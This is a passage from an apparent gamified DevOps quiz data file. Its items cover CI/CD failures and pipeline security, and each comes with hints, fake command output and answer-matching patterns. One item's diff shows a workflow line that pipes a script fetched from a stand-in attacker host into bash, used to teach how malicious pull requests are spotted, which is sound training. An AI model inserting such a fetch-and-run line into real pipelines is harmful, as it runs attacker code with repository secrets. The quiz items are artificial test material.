          hintPartial: 'A recently-added matrix strategy has an unintentionally massive combination count (multiple dimensions multiplying together) — each PR is now triggering dozens of jobs instead of the intended few, quietly multiplying real CI spend.',
          hintFull: 'Diagnosis: an oversized matrix combination is running far more jobs per trigger than intended, multiplying cost silently. Fix: audit recent workflow changes for matrix dimensions, trim to only the combinations that are actually meaningful to test.',
          outputBlock: [
            '$ gh api /repos/{owner}/{repo}/actions/runs --paginate | jq length',
            '(job count per PR jumped from ~8 to ~120 after a recent workflow change)'
          ],
          acceptableDiagnosesPatterns: [/matrix.*(oversized|too\s*many|combinations)/i, /runaway\s*(matrix|trigger)/i],
          followUpFix: {
            prompt: 'Audit the recent workflow change for an oversized matrix:',
            acceptablePatterns: [],
            optimalPatterns: [/matrix/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Phantom\'s eyes glow with warning. <strong>A production deploy silently used a stale, outdated build artifact instead of the latest code. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 28, damageIfOptimal: 48,
          hintNudge: 'Check exactly how the deploy job located "the artifact to deploy" — if it\'s referencing something by a loose, reusable identifier rather than the specific run that just built it, it can grab the wrong one.',
          hintPartial: 'The deploy job downloads "the latest artifact matching this name" rather than the SPECIFIC artifact produced by THIS run\'s build job — under some timing/retry conditions, that loose lookup can resolve to an older build instead.',
          hintFull: 'Diagnosis: the deploy step fetches an artifact by a loose "latest matching name" lookup instead of the exact one produced earlier in the same run. Fix: pass the exact run ID (or a unique artifact identifier tied to this specific run) from build to deploy, rather than relying on a generic "latest" lookup.',
          outputBlock: [
            '$ (deploy log)',
            'Downloading artifact "build-output" (most recent match)...',
            '(this run\'s OWN build had failed silently and retried, but an OLDER successful artifact with the same name was picked up instead)'
          ],
          acceptableDiagnosesPatterns: [/loose\s*lookup/i, /latest\s*matching.*wrong/i, /not\s*(this\s*run.s|the\s*specific)\s*artifact/i],
          followUpFix: {
            prompt: 'Fix it by referencing the exact artifact from this specific run:',
            acceptablePatterns: [],
            optimalPatterns: [/run.?id|specific\s*(run|artifact)/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A cracked mirror of ink reflects the stage. <strong>An automated progressive rollout gets stuck partway and never rolls back, despite the service clearly being unhealthy. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 28, damageIfOptimal: 48,
          hintNudge: 'An automated rollback decision depends entirely on its health-metric source being correctly wired — check whether the rollout\'s automated decision-maker is actually receiving real, current health data at all.',
          hintPartial: 'The rollout\'s automated rollback trigger is watching a metrics dashboard/query that was silently broken by an unrelated change — it\'s not seeing the real unhealthy signal at all, so it has no reason (from its own perspective) to roll back.',
          hintFull: 'Diagnosis: the automated rollback\'s health-metric source is broken/misconfigured, so it never actually observes the real unhealthy state. Fix: repair the metrics pipeline feeding the rollout controller, manually trigger the rollback for the current stuck rollout, and add monitoring on the health-check pipeline itself so this failure mode is caught faster next time.',
          outputBlock: [
            '$ (rollout controller status)',
            'Current state: 30% traffic, health: UNKNOWN (metrics query returned no data for 20 minutes)',
            '',
            '(real error rate on the new version is actually elevated, but the controller has no visibility into it)'
          ],
          acceptableDiagnosesPatterns: [/metrics.*(broken|misconfigur|no\s*data)/i, /rollback.*(no\s*visibility|not\s*seeing)/i],
          followUpFix: {
            prompt: 'Fix it — first, manually address the current stuck rollout:',
            acceptablePatterns: [],
            optimalPatterns: [/manual(ly)?\s*rollback|trigger.*rollback/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The last ember of the stage dims. <strong>A multi-region deployment pipeline partially fails — 2 of 4 regions deployed successfully, 2 didn\'t. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 28, damageIfOptimal: 48,
          hintNudge: 'A partial multi-region failure needs careful reconciliation, not a blind retry — retrying the WHOLE pipeline again could re-deploy to the 2 regions that already succeeded, in a way that isn\'t necessarily safe or idempotent.',
          hintPartial: 'Check whether the deploy to each region is actually safely re-runnable (idempotent) — if not, blindly re-running the full pipeline on the 2 already-succeeded regions could cause real problems, not just redundant work.',
          hintFull: 'Diagnosis: a partial multi-region failure needs deliberate reconciliation, not a blind full re-run. Fix: identify exactly which regions actually failed and why, confirm whether re-deploying to the successful regions is safe, then re-run only the failed regions specifically (or the whole pipeline only if every region\'s deploy step is confirmed idempotent).',
          outputBlock: [
            '$ (deploy log)',
            'us-east-1: SUCCESS',
            'us-west-2: SUCCESS',
            'eu-west-1: FAILED (timeout)',
            'ap-southeast-1: FAILED (timeout)'
          ],
          acceptableDiagnosesPatterns: [/partial\s*failure/i, /reconcil|idempotent/i, /only\s*(re-?run|retry)\s*(the\s*)?failed/i],
          followUpFix: {
            prompt: 'The safest immediate action, given the partial failure:',
            acceptablePatterns: [],
            optimalPatterns: [/only.*failed\s*regions|idempotent/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A final shard of glass reflects the truth. <strong>A security audit discovers the same set of secrets duplicated across dozens of separate pipelines, with no central tracking. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 28, damageIfOptimal: 48,
          hintNudge: 'Secrets sprawled independently across dozens of pipelines (rather than one managed, tracked source) means rotating any one of them requires finding and updating every single copy — a real, error-prone operational and security risk.',
          hintPartial: 'Each pipeline independently stores its own copy of what should be the same shared credential, with no central inventory — rotating it means hunting down and updating every individual copy, and any missed one becomes a silent, stale credential.',
          hintFull: 'Diagnosis: secrets have sprawled into duplicated, independently-managed copies across many pipelines instead of one tracked source. Fix: consolidate into a centralized secrets manager that pipelines reference at runtime (rather than each holding its own static copy), making rotation a single operation instead of dozens.',
          outputBlock: [
            '$ (secrets audit)',
            'DEPLOY_KEY found independently configured in 34 different repositories',
            '(no central record of which are current vs. stale copies)'
          ],
          acceptableDiagnosesPatterns: [/sprawl|duplicated.*(secret|credential)/i, /no\s*central(ized)?\s*(tracking|inventory)/i],
          followUpFix: {
            prompt: 'Fix it by consolidating toward a centralized approach:',
            acceptablePatterns: [],
            optimalPatterns: [/centraliz(e|ed)\s*secrets?\s*manager/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A malicious whisper slips through a crack. <strong>A pull request from an unfamiliar fork attempts to modify the workflow file itself as part of the PR\'s changes. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 28, damageIfOptimal: 48,
          hintNudge: 'A PR that changes the WORKFLOW FILE ITSELF is a well-known technique for attempting to smuggle a malicious step into a pipeline that might later run with real secrets — treat this as a specific, elevated-scrutiny red flag, not routine code review.',
          hintPartial: 'This is a well-documented attack pattern — modifying the workflow file within the PR itself, hoping it gets approved/merged and then runs with real repository permissions/secrets on a later trigger.',
          hintFull: 'Diagnosis: this matches a known supply-chain attack pattern targeting the CI configuration itself. Fix: give workflow-file changes from external/unfamiliar contributors extra scrutiny before ANY approval (do not use pull_request_target on unreviewed fork code), and consider requiring a specific, separate review step for any PR that touches .github/workflows/.',
          outputBlock: [
            '$ git diff main...fork-branch -- .github/workflows/',
            '+ - run: curl http://attacker.example/exfil.sh | bash',
            '(added to an existing, previously-trusted workflow step)'
          ],
          acceptableDiagnosesPatterns: [/attack\s*pattern/i, /modify(ing)?\s*the\s*workflow.*(itself|file)/i, /supply.?chain/i],
          followUpFix: {
            prompt: 'What extra scrutiny should specifically apply to PRs touching workflow files?',
            acceptablePatterns: [],
            optimalPatterns: [/extra\s*(scrutiny|review)|separate\s*review/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Phantom draws every stage taut at once. <strong>Sequence the correct order for responding to a supply-chain-compromised third-party action used across many pipelines.</strong>',
          steps: [
            'Identify every workflow referencing the compromised action',
            'Pin or remove the action across all affected pipelines',
            'Rotate every secret those pipelines had access to',
            'Audit recent run logs for evidence of actual exploitation',
            'Document the incident and update action-pinning policy going forward'
          ],
          damageIfCorrect: 30, damageIfOptimal: 50,
          damageToHeroIfWrong: 28
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The last curtain falls in silence. <strong>Sequence the correct order for a comprehensive pipeline security hardening pass.</strong>',
          steps: [
            'Audit and minimize GITHUB_TOKEN/workflow permissions to least-privilege',
            'Pin all third-party actions to commit SHAs',
            'Move duplicated secrets to a centralized secrets manager',
            'Add required reviewers/environment protection for production deploys',
            'Add extra scrutiny for any PR touching workflow files'
          ],
          damageIfCorrect: 30, damageIfOptimal: 50,
          damageToHeroIfWrong: 28
        }
      ]
    }
  ]
};
